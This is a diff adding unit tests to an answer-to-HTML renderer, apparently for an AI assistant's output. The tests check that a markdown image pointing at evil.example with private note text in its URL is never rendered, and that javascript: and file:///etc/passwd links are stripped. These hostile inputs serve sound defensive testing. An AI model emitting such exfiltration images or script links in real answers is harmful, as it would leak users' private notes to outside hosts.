@@ -25,4 +25,19 @@ describe("answerHtml", () => {
     expect(html).not.toContain("<img");
     expect(html).not.toContain("onerror");
   });
+
+  it("never loads images, so an answer can't send note text anywhere", () => {
+    const html = answerHtml("Summary ![pixel](https://evil.example/?q=my+private+note) done", 0);
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("evil.example");
+    expect(html).toContain("pixel");
+  });
+
+  it("keeps web links but drops other schemes", () => {
+    const html = answerHtml("[site](https://example.com) [bad](javascript:alert(1)) [file](file:///etc/passwd)", 0);
+    expect(html).toContain('href="https://example.com"');
+    expect(html).not.toContain("javascript:");
+    expect(html).not.toContain("file:");
+    expect(html).toContain("bad");
+  });
 });
